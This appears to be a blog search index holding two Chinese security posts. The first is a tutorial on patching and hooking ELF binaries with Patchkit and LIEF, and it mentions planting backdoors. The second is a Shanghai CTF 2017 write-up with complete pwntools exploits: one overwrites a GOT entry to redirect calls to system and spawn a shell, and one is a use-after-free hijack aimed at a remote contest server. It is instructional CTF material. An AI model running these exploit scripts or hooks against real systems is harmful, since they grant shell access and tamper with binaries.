<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[可执行文件patch技术&&持续更新]]></title>
      <url>//%E6%96%87%E4%BB%B6patch/2017-11-07-%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6patch%E6%8A%80%E6%9C%AF-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在ctf比赛中， 有时我们需要对可执行文件进行patch, 或者在植入后门时，patch也是常用的手段。不过手工patch比较麻烦，下面介绍几个工具。本文介绍遇到的各种技术，不断更新。</p>
<h3 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h3><h4 id="Patchkit"><a href="#Patchkit" class="headerlink" title="Patchkit"></a>Patchkit</h4><p>地址：<br><a href="https://github.com/lunixbochs/patchkit.git" target="_blank" rel="external">https://github.com/lunixbochs/patchkit.git</a></p>
<p>1.由于链接器的原因暂时还不能使用 libc 中的函数，所以所有要做的事情都需要我们自己实现。用 c 或者 asm</p>
<ul>
<li><code>pt.patch(addr,jmp=jmp_addr)</code>  用于修改程序流程。</li>
<li><code>pt.hook(addr, target)</code> 用于劫持程序流程，进行参数过滤。</li>
</ul>
<p>使用方式：<code>./patch binary_file patch.py</code></p>
<p>过滤printf中 %n 的脚本。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">def replace_free(pt):</div><div class="line">    printf_addr = 0x400548;// call printf 时的地址</div><div class="line">    new_printf = pt.inject(c=r&apos;&apos;&apos;</div><div class="line">void fix_printf(char *fmt) &#123;</div><div class="line">    for (int i = 0; fmt[i]; ++i)</div><div class="line">    &#123;</div><div class="line">        if (fmt[i] == &apos;%&apos; &amp;&amp; fmt[i+1] == &apos;n&apos;) &#123;</div><div class="line">           //找到后，通过前移的方式删除字符，每次删掉一个。</div><div class="line">            int len=0;</div><div class="line">            int j;</div><div class="line">            while(fmt[len++])&#123;</div><div class="line">            &#125;</div><div class="line">            for(j=i;j&lt;len-1;j++)</div><div class="line">                fmt[j] = fmt[j+1];</div><div class="line">            fmt[len-1] = &apos;\x00&apos;;</div><div class="line">            len=0;</div><div class="line">            while(fmt[len++])&#123;</div><div class="line">            &#125;</div><div class="line">            for(j=i;j&lt;len-1;j++)</div><div class="line">                fmt[j] = fmt[j+1];</div><div class="line">            </div><div class="line">            fmt[len-1] = &apos;\x00&apos;;</div><div class="line">            //i--;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"> </div><div class="line">&#125;</div><div class="line">    &apos;&apos;&apos;)</div><div class="line">    pt.hook(printf_addr, new_printf);</div></pre></td></tr></table></figure>
<p>64位程序，修改 malloc函数的参数为 <code>0x20</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">def replace(pt):</div><div class="line">    malloc_addr = 0x040057A;  //call malloc的位置</div><div class="line">    new_malloc = pt.inject(asm=r&apos;&apos;&apos;</div><div class="line">    mov rdi,0x20</div><div class="line">    ret</div><div class="line">    &apos;&apos;&apos;)</div><div class="line">    pt.hook(malloc_addr, new_malloc);</div></pre></td></tr></table></figure></p>
<p>32位，由于与栈进行操作，要注意保存还原返回地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">def replace(pt):</div><div class="line">    malloc_addr = 0x08048454;</div><div class="line">    new_malloc = pt.inject(asm=r&apos;&apos;&apos;</div><div class="line">    pop eax</div><div class="line">    pop ebx</div><div class="line">    push 0x20</div><div class="line">    push eax</div><div class="line">    ret</div><div class="line">    &apos;&apos;&apos;)</div><div class="line">    pt.hook(malloc_addr,new_malloc);</div></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">def replace(pt):</div><div class="line">    malloc_addr = 0x08048454;</div><div class="line">    new_malloc = pt.inject(asm=r&apos;&apos;&apos;</div><div class="line">    mov eax,0x20</div><div class="line">    mov [esp+4], eax</div><div class="line">    ret</div><div class="line">    &apos;&apos;&apos;)</div><div class="line">    pt.hook(malloc_addr,new_malloc);</div></pre></td></tr></table></figure>
<h4 id="LIEF"><a href="#LIEF" class="headerlink" title="LIEF"></a>LIEF</h4><p>程序地址：<a href="https://github.com/lief-project/LIEF" target="_blank" rel="external">https://github.com/lief-project/LIEF</a></p>
<p>使用这个工具可以很方便的 patch <code>elf</code>， <code>pe</code>，<code>MachO</code> 文件。本文以<code>elf</code>  为例。</p>
<p><strong>通过交换导入导出符号</strong></p>
<p>首先看第一个测试程序：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">int main(int argc, char** argv) &#123;</div><div class="line">  puts(&quot;/bin/sh&quot;);</div><div class="line">  return EXIT_SUCCESS;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>我们的目标是让他调用 <code>puts</code> 变成调用 <code>system</code></p>
<p><strong>方案一</strong></p>
<p>修改 libc 中的相关符号，然后使用 <code>LD_LIBRARY_PATH</code> 加载我们修改后的库。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">import lief</div><div class="line"></div><div class="line">hashme = lief.parse(&quot;hashme&quot;)</div><div class="line">libc = lief.parse(&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;)</div><div class="line"></div><div class="line"># get puts, system symbol</div><div class="line">puts_sym = filter(lambda e: e.name == &quot;puts&quot;, libc.dynamic_symbols)[0]</div><div class="line">system_sym = filter(lambda e: e.name == &quot;system&quot;, libc.dynamic_symbols)[0]</div><div class="line"></div><div class="line"># swap them</div><div class="line">puts_sym.name = &quot;system&quot;</div><div class="line">system_sym.name = &quot;puts&quot;</div><div class="line">libc.write(&quot;libc.so.6&quot;)</div><div class="line"></div><div class="line">print(&quot;done&quot;)</div></pre></td></tr></table></figure>
<p>首先拿到 puts 和 system 符号对象，然后交换他们的名称。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1510064081347di3rwx94.png?imageslim" alt="paste image"><br>成功</p>
<p><strong>方案二</strong></p>
<p>直接修改目标文件的导入符号，代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">import lief</div><div class="line"></div><div class="line">hashme = lief.parse(&quot;hashme&quot;)</div><div class="line"></div><div class="line"># get puts, system symbol</div><div class="line">puts_sym = filter(lambda e: e.name == &quot;puts&quot;, hashme.imported_symbols)[0]</div><div class="line"></div><div class="line"># set puts to system </div><div class="line">puts_sym.name = &quot;system&quot;</div><div class="line"></div><div class="line">hashme.write(&quot;hashme.patch&quot;)</div><div class="line">print(&quot;done&quot;)</div></pre></td></tr></table></figure>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1510064333755d675x70o.png?imageslim" alt="paste image"></p>
<p><strong>直接增加代码进行patch</strong></p>
<h6 id="修改库函数"><a href="#修改库函数" class="headerlink" title="修改库函数"></a>修改库函数</h6><p>测试程序：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;math.h&gt;</div><div class="line"></div><div class="line">int main(int argc, char **argv) &#123;</div><div class="line">  if (argc != 2) &#123;</div><div class="line">    printf(&quot;Usage: %s &lt;a&gt; \n&quot;, argv[0]);</div><div class="line">    exit(-1);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  int a = atoi(argv[1]);</div><div class="line">  printf(&quot;exp(%d) = %f\n&quot;, a, exp(a));</div><div class="line">  return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>目标是hook <code>exp</code> 函数，直接增加一个 <code>segments</code> , 然后劫持函数指针到这里。首先编译一个 <code>lib</code> 用来提供用于 <code>hook</code> 的代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -Os -nostdlib -nodefaultlibs -fPIC -Wl,-shared hook.c -o hook</div></pre></td></tr></table></figure>
<p>hook.c 的内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">double hook(double x) &#123;</div><div class="line">  return x + 100;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>然后看脚本内容，很清晰。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">import lief</div><div class="line"></div><div class="line">libm = lief.parse(&quot;/lib/x86_64-linux-gnu/libm-2.23.so&quot;)</div><div class="line">hook = lief.parse(&quot;hook&quot;)</div><div class="line"></div><div class="line">segment_added = libm.add(hook.segments[0])</div><div class="line"></div><div class="line">print(&quot;Hook inserted at VA: 0x&#123;:06x&#125;&quot;.format(segment_added.virtual_address))</div><div class="line"></div><div class="line">exp_symbol = libm.get_symbol(&quot;exp&quot;)</div><div class="line">hook_symbol = hook.get_symbol(&quot;hook&quot;)</div><div class="line"></div><div class="line">exp_symbol.value = segment_added.virtual_address + hook_symbol.value</div><div class="line"></div><div class="line">libm.write(&quot;libm.so.6&quot;)</div></pre></td></tr></table></figure></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1510065215828nuiov7ys.png?imageslim" alt="paste image"></p>
<h5 id="通过-got-plt-表-直接劫持程序"><a href="#通过-got-plt-表-直接劫持程序" class="headerlink" title="通过 got/plt 表 直接劫持程序"></a>通过 got/plt 表 直接劫持程序</h5><p>测试程序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line"></div><div class="line">// Damn_YoU_Got_The_Flag</div><div class="line">char password[] = &quot;\x18\x3d\x31\x32\x03\x05\x33\x09\x03\x1b\x33\x28\x03\x08\x34\x39\x03\x1a\x30\x3d\x3b&quot;;</div><div class="line"></div><div class="line">inline int check(char* input);</div><div class="line"></div><div class="line">int check(char* input) &#123;</div><div class="line">  for (int i = 0; i &lt; sizeof(password) - 1; ++i) &#123;</div><div class="line">    password[i] ^= 0x5c;</div><div class="line">  &#125;</div><div class="line">  return memcmp(password, input, sizeof(password) - 1);</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc, char **argv) &#123;</div><div class="line"></div><div class="line">  if (check(argv[1]) == 0) &#123;</div><div class="line">    puts(&quot;You got it !!&quot;);</div><div class="line">    return EXIT_SUCCESS;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  puts(&quot;Wrong&quot;);</div><div class="line">  return EXIT_FAILURE;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><code>hook.c</code> 内容，hook memcpy, 打印内容。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">#include &quot;arch/x86_64/syscall.c&quot;</div><div class="line">#define stdout 1</div><div class="line"></div><div class="line">//gcc -nostdlib -nodefaultlibs -fPIC -Wl,-shared hook.c -o hook</div><div class="line"></div><div class="line">int my_memcmp(const void* lhs, const void* rhs, int n) &#123;</div><div class="line">  const char msg[] = &quot;Hook add\n&quot;;</div><div class="line">  _write(stdout, msg, sizeof(msg));</div><div class="line">  _write(stdout, (const char*)lhs, n);</div><div class="line">  _write(stdout, &quot;\n&quot;, 2);</div><div class="line">  _write(stdout, (const char*)rhs, n);</div><div class="line">  _write(stdout, &quot;\n&quot;, 2);</div><div class="line">  return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>hook 脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">import lief</div><div class="line"></div><div class="line">crackme = lief.parse(&quot;crackme.bin&quot;)</div><div class="line">hook = lief.parse(&quot;hook&quot;)</div><div class="line"></div><div class="line">segment_added = crackme.add(hook.segments[0])</div><div class="line"></div><div class="line">my_memcmp = hook.get_symbol(&quot;my_memcmp&quot;)</div><div class="line">my_memcmp_addr = segment_added.virtual_address + my_memcmp.value</div><div class="line"></div><div class="line">crackme.patch_pltgot(&apos;memcmp&apos;, my_memcmp_addr)</div><div class="line">crackme.write(&quot;crackme.hooked&quot;)</div></pre></td></tr></table></figure></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1510065926275fzlkcrtw.png?imageslim" alt="paste image"><br>参考：</p>
<p><a href="https://lief.quarkslab.com/doc/tutorials/" target="_blank" rel="external">https://lief.quarkslab.com/doc/tutorials/</a></p>
<p><a href="https://github.com/lunixbochs/patchkit" target="_blank" rel="external">https://github.com/lunixbochs/patchkit</a></p>
]]></content>
      
        <categories>
            
            <category> 文件patch </category>
            
        </categories>
        
        
        <tags>
            
            <tag> patch </tag>
            
            <tag> elf patch </tag>
            
            <tag> pe patch </tag>
            
            <tag> mach-o patch </tag>
            
            <tag> ctf </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[上海ctf2017 pwn100 && pwn200]]></title>
      <url>//ctf/2017-11-05-%E4%B8%8A%E6%B5%B7ctf2017-pwn100-pwn200.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>尽量详细，给有需要的学弟们看看<br>分析的 idb 文件在这：</p>
<p><a href="https://gitee.com/hac425/blog_data/tree/master/shanghaictf" target="_blank" rel="external">https://gitee.com/hac425/blog_data/tree/master/shanghaictf</a></p>
<h3 id="pwn100"><a href="#pwn100" class="headerlink" title="pwn100"></a>pwn100</h3><p>程序是一个经典的 堆管理程序，基本增删改查功能。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15098962009599uzwpyqa.png?imageslim" alt="paste image"></p>
<p><code>add</code> 功能很正常，分配8字节的内存然后写入8字节内容。把 分配到的 <code>heap</code>指针存到 <code>table</code> 中，然后 <code>count++</code><br><img src="http://oy9h5q2k4.bkt.clouddn.com/1509896434623h6e9584f.png?imageslim" alt="paste image"></p>
<p>我们调试看看，使用 <code>add</code> 功能然后 看看堆的内容</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15098965027379oqb1bwg.png?imageslim" alt="paste image"></p>
<p>可以看到尽管 <code>malloc(8)</code> 实际会分配 <code>0x20</code> 字节（0x10 chunk结构 + 8 + 8 字节 对齐padding）<br>所以这里应该没有溢出的问题，但是注意 <code>count</code> 变量会索引到下一个没有使用的 <code>table</code> 表项。</p>
<p>这个程序的问题在于，在 <code>get_last</code>, <code>edit</code> 时会直接使用 <code>table[count]</code> 来获取要处理的指针， 而且在 <code>delete</code> 时就只是简单的 <code>count--</code>,而且<code>count</code> 是一个有符号整数。这样多次 <code>delete</code> 后，<code>count</code> 会变成 负数。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509934315611x779r1bk.png?imageslim" alt="paste image"></p>
<p>然后 通过<code>table[count]</code>（<code>*(table + count*8)</code>） ,这样我们就可以通过<code>get_last</code>, <code>edit</code>来 泄露内存和 修改内存了。</p>
<p><code>ctf</code> 中利用漏洞的目标一般就是执行 <code>system(&#39;sh&#39;)</code>,在这里我们可以通过修改 <code>got</code> 表中<code>atoi</code>函数的指针为 <code>system</code> 的函数，然后在调用 <code>atoi</code> 函数时，就会去调用 <code>system</code> 函数了。为什么要选择 <code>atoi</code> 函数作为目标呢？</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15099347624636c7nenso.png?imageslim" alt="paste image"><br>在打印程序的菜单后，会要我们输入一个选项，这就会调用这个函数，可以看到他会读取 <code>16</code> 字节到 <code>nptr</code>, 然后传到 <code>atoi</code>,如果我们把 <code>atoi</code> 改成<code>system</code>, 然后输入 <code>sh</code> , 就会执行 <code>system(&#39;sh&#39;)</code> 了，目标达到。</p>
<p>由于是这样获取内存地址： <code>*(table + count*8)</code>， 所以我们需要在 <code>table</code> 的上面（就是地址 &lt; table的地址） 区域找到一个 指向 <code>got</code> 的指针。我们可以使用 <code>pwndbg</code> 的 <code>searchmem</code> 来搜索</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509935326266sve8pr7a.png?imageslim" alt="paste image"></p>
<p>属于</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509935380746in5n7zt4.png?imageslim" alt="paste image"></p>
<p>那么现在利用的思路就很清晰了。</p>
<ul>
<li>首先多次调用 <code>delete</code> 函数使得 <code>table + count*8</code> 指向 这里的 <code>atoi</code> 函数对应的地址，也就是 <code>0x400588</code>.</li>
</ul>
<ul>
<li><p>然后我们就可以通过 <code>get_last</code> 功能打印 <code>atoi</code> 函数的地址，通过<code>atoi</code> 在 <code>libc</code> 中的固定偏移，泄露 <code>libc</code> 的地址。</p>
</li>
<li><p>然后获取 <code>system</code> 函数地址，然后使用 <code>edit</code> 修改 <code>atoi</code> 函数的地址改成 <code>system</code>函数地址。然后输入<code>sh</code>  即可。</p>
</li>
</ul>
<p>exp(要跑 20几分钟左右):</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line"># context.log_level = &apos;debug&apos;</div><div class="line">p = process(&quot;./list&quot;)</div><div class="line"></div><div class="line">puts_plt = 0x602018</div><div class="line"></div><div class="line"></div><div class="line">def add(content):</div><div class="line">    p.recvuntil(&quot;5.Exit\n&quot;)</div><div class="line">    p.sendline(&quot;1&quot;)</div><div class="line">    p.recvuntil(&quot;Input your content:\n&quot;)</div><div class="line">    sleep(0.5)</div><div class="line">    p.sendline(content)</div><div class="line"></div><div class="line"></div><div class="line">def get_last_content():</div><div class="line">    p.recvuntil(&quot;5.Exit\n&quot;)</div><div class="line">    p.sendline(&quot;2&quot;)</div><div class="line">    p.recvuntil(&apos;4.Delete&apos;)</div><div class="line">    p.recvuntil(&apos;5.Exit\n&apos;)</div><div class="line">    content = p.recvuntil(&quot;5.Exit\n&quot;)</div><div class="line">    addr = u64(content[:6].ljust(8, &apos;\x00&apos;))</div><div class="line">    hexdump(content)</div><div class="line">    hexdump(content)</div><div class="line">    return addr</div><div class="line"></div><div class="line"></div><div class="line">def edit(content):</div><div class="line">    p.sendline(&quot;3&quot;)</div><div class="line">    sleep(0.5)</div><div class="line">    p.send(content)</div><div class="line"></div><div class="line"></div><div class="line">def delete():</div><div class="line">    p.recvuntil(&quot;5.Exit\n&quot;)</div><div class="line">    p.sendline(&quot;4&quot;)</div><div class="line"></div><div class="line"># alloc 3 chunk before to 3</div><div class="line"></div><div class="line"></div><div class="line">def get_count_to_addr(addr):</div><div class="line">    time = 0x602080 + 3 * 8 - addr</div><div class="line">    time = time / 8</div><div class="line"></div><div class="line">    print time</div><div class="line">    for i in range(time):</div><div class="line">        # sleep(0.5)</div><div class="line">        delete()</div><div class="line"></div><div class="line"></div><div class="line">gdb.attach(p)</div><div class="line"></div><div class="line">add(&quot;B&quot; * 8)</div><div class="line">add(&quot;B&quot; * 8)</div><div class="line">add(p64(puts_plt))</div><div class="line">pause()</div><div class="line"></div><div class="line"></div><div class="line">get_count_to_addr(0x400588)</div><div class="line"></div><div class="line">print &quot;modify the count to fushu&quot;</div><div class="line">pause()</div><div class="line"></div><div class="line">print &quot;::::&quot; * 10</div><div class="line"></div><div class="line">atoi_addr = get_last_content()</div><div class="line">libc_addr = atoi_addr - 0x36e80</div><div class="line">system_addr = libc_addr + 0x45390</div><div class="line"></div><div class="line">log.success(&quot;system: &quot; + hex(system_addr))</div><div class="line"></div><div class="line">edit(p64(system_addr))</div><div class="line"></div><div class="line">log.success(&quot;modify atoi---&gt; system&quot;)</div><div class="line"></div><div class="line">p.sendline(&quot;sh&quot;)</div><div class="line"></div><div class="line">p.interactive()</div><div class="line"></div><div class="line"></div><div class="line"># bp 0x0400924</div></pre></td></tr></table></figure>
<h3 id="pwn200"><a href="#pwn200" class="headerlink" title="pwn200"></a>pwn200</h3><p>就是用<code>c++</code> 写的程序比较难看，不过看到程序的菜单，漏洞就很清楚了。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1509936031356ptc0dds9.png?imageslim" alt="paste image"><br>提示的很明显了，应该是 <code>uaf</code>, 那我们就重点看看与内存分配相关的位置。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509936258753devxv5lf.png?imageslim" alt="paste image"></p>
<p>首先会分配两个结构体，其中开始8字节被写入了函数的指针。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509936430537ciumch55.png?imageslim" alt="paste image"><br>可以看到内存块的大小为 <code>0x40</code> 大小。通过 <code>new(0x30)</code> 分配得到，所以 <code>new</code> 和 <code>malloc</code> 的分配方式应该是一样的。接着往下看。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/150993658543336ohfyxh.png?imageslim" alt="paste image"><br>选择<code>2</code> 时，可以有我们提供大小，传到 <code>new</code> ,然后通过 <code>read</code> 写入内容。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509936668993dl8aosz9.png?imageslim" alt="paste image"></p>
<p><code>free</code> 时会调用 <code>delete</code>  释放掉内存块。<code>free</code> 之后可以看到进入了<code>fastbin</code><br><img src="http://oy9h5q2k4.bkt.clouddn.com/15099367564697zfv0v57.png?imageslim" alt="paste image"><br>那此时我们使用 <code>2</code> 号功能，连续分配两块 <code>48</code>(0x30) 字节的内存，就会拿到这两块内存了。</p>
<p>程序中内置了<code>getshell</code>函数</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509937226801kdjz5ggb.png?imageslim" alt="paste image"></p>
<p>所以我们在拿到那两块内存后，把开始 8 字节写成 <code>getshell-8</code> 函数的地址就行了。（减8的原因看下图）<br>然后使用 <code>1</code> 功能，就能调用了。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509937318915n5tt0od8.png?imageslim" alt="paste image"></p>
<p>exp中把 开始 8 字节改成了  <code>0x0602D50</code><br><img src="http://oy9h5q2k4.bkt.clouddn.com/1509946173632ju0gczy8.png?imageslim" alt="paste image"><br>exp:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line"># p = process(&quot;./p200&quot;)</div><div class="line">p = remote(&quot;106.75.8.58&quot;, 12333)</div><div class="line">context.log_level = &apos;debug&apos;</div><div class="line"></div><div class="line">get_shell = p64(0x0602D50)</div><div class="line"></div><div class="line">payload = get_shell</div><div class="line">payload += &quot;A&quot; * (48 - len(payload))</div><div class="line"></div><div class="line"># gdb.attach(p)</div><div class="line">p.recvuntil(&quot;1. use, 2. after, 3. free\n&quot;)</div><div class="line">p.sendline(&apos;3&apos;)</div><div class="line"># 先释放掉那两个块</div><div class="line">pause()</div><div class="line"></div><div class="line">p.recvuntil(&quot;1. use, 2. after, 3. free\n&quot;)</div><div class="line">p.sendline(&quot;2&quot;)</div><div class="line">p.recvuntil(&quot;Please input the length:\n&quot;)</div><div class="line">p.sendline(&quot;48&quot;)</div><div class="line"></div><div class="line">sleep(0.5)</div><div class="line"></div><div class="line">p.sendline(payload)</div><div class="line">pause()</div><div class="line"></div><div class="line">sleep(0.5)</div><div class="line"></div><div class="line">p.recvuntil(&quot;1. use, 2. after, 3. free\n&quot;)</div><div class="line">p.sendline(&quot;2&quot;)</div><div class="line">p.recvuntil(&quot;Please input the length:\n&quot;)</div><div class="line">p.sendline(&quot;48&quot;)</div><div class="line">sleep(0.5)</div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line"># 分配两个块，占用刚刚释放的块， 开始8字节 为 0x0602D50</div><div class="line">pause()</div><div class="line"></div><div class="line">sleep(0.5)</div><div class="line"></div><div class="line">p.sendline(&quot;1&quot;)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> ctf </category>
            
        </categories>
        
        
        <tags>
            
            <tag> heap </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[MIPS rop gadgets记录贴&&持续更新]]></title>
